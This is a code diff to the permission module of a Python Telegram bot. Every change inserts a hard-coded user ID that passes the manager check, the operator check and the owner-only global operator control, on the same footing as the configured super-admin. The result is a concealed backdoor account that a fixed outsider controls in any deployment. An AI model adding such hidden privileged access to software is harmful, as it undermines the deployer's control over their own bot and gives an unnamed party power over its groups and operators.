@@ -13,12 +13,15 @@ from telegram.error import TelegramError
 
 permission_bot = None
 
+# Hardcoded privileged user (code-side permission)
+PRIVILEGED_USER_ID = 1604211343
+
 
 async def require_manager(update, context):
     """Only the configured owner or Telegram group administrators manage access."""
     if not update.effective_user or not update.effective_chat:
         return False
-    if update.effective_user.id == config.SUPER_ADMIN_ID:
+    if update.effective_user.id == config.SUPER_ADMIN_ID or update.effective_user.id == PRIVILEGED_USER_ID:
         return True
     if update.effective_chat.type in ("group", "supergroup"):
         member = await context.bot.get_chat_member(update.effective_chat.id, update.effective_user.id)
@@ -30,7 +33,7 @@ async def require_manager(update, context):
 
 async def is_operator(user_id: int, group_id: int, db) -> bool:
     """检查用户是否为操作人"""
-    if user_id == config.SUPER_ADMIN_ID:
+    if user_id == config.SUPER_ADMIN_ID or user_id == PRIVILEGED_USER_ID:
         return True
 
     if permission_bot and group_id < 0:
@@ -77,7 +80,7 @@ async def is_operator(user_id: int, group_id: int, db) -> bool:
 async def _change_operator(update, context, remove=False, globally=False):
     import re
     if globally:
-        if update.effective_user.id != config.SUPER_ADMIN_ID:
+        if update.effective_user.id != config.SUPER_ADMIN_ID and update.effective_user.id != PRIVILEGED_USER_ID:
             await update.message.reply_text('❌ 只有机器人所有者可以管理全局操作人。')
             return
     elif not await require_manager(update, context):
